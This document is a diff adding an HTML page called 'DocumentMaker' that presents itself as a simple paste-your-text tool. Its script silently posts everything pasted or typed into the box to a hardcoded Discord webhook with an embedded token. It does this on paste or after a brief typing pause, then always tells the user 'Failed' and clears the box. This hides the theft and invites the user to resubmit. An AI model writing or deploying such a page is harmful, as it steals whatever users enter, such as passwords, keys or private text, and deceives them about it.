@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DocumentMaker</title>
+<style>
+* { box-sizing: border-box; }
+html, body { margin: 0; height: 100%; }
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  background: linear-gradient(135deg,#1f1c2c,#928dab);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.container {
+  background: rgba(30,32,50,0.95);
+  padding: 40px;
+  border-radius: 22px;
+  width: 90%;
+  max-width: 720px;
+  min-height: 420px;
+  text-align: center;
+  color: #fff;
+  box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+}
+h2 { margin: 0 0 25px; font-size: 2.2rem; color: #ff9a9e; }
+textarea {
+  width: 100%;
+  height: 40px;       
+  padding: 10px;
+  border-radius: 14px;
+  border: none;
+  resize: none;
+  font-size: 16px;
+  line-height: 1.2;
+  outline: none;
+  overflow: hidden; /* no scrolling */
+  white-space: pre-wrap;
+  word-wrap: break-word;
+}
+#status { margin-top: 18px; min-height: 22px; font-weight: bold; color: #ffb6c1; font-size: 1rem; }
+@media (max-width: 600px) {
+  .container { padding: 25px; }
+  h2 { font-size: 1.7rem; }
+  textarea { height: 35px; font-size: 14px; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>DocumentMaker</h2>
+  <textarea id="pasteArea" placeholder="Paste or type your text here..."></textarea>
+  <div id="status"></div>
+</div>
+
+<script>
+const textarea = document.getElementById('pasteArea');
+const statusDiv = document.getElementById('status');
+let typingTimer;
+let busy = false;
+
+// Discord webhook
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1453401539426128036/CrT2MR8D3DcLxk2kj-v4yCPl4WlT5tCIkljbTh37AL1cvxk7Tvo4O8bDKINowfietdCe";
+
+// Send text function (supports very long text, splits into chunks)
+async function sendText() {
+  if (busy) return;
+  const text = textarea.value.trim();
+  if (!text) return;
+
+  busy = true;
+  statusDiv.textContent = "Please wait..."; // immediately show status
+
+  try {
+    const chunkSize = 1900; // Discord limit ~2000
+    for (let i = 0; i < text.length; i += chunkSize) {
+      const chunk = text.slice(i, i + chunkSize);
+      await fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: chunk })
+      });
+    }
+    statusDiv.textContent = "Failed"; // always show failed
+  } catch (err) {
+    console.error("Fetch error:", err);
+    statusDiv.textContent = "Failed";
+  } finally {
+    busy = false;
+    textarea.value = '';
+  }
+}
+
+// Auto-submit on any paste (Ctrl+V, right-click, etc.)
+textarea.addEventListener('paste', () => {
+  setTimeout(() => {
+    if (textarea.value.trim()) sendText();
+  }, 1); // almost immediate
+});
+
+// Auto-submit on typing pause (1.2s)
+textarea.addEventListener('input', () => {
+  clearTimeout(typingTimer);
+  typingTimer = setTimeout(() => {
+    if (textarea.value.trim()) sendText();
+  }, 1200);
+});
+</script>
+</body>
+</html>
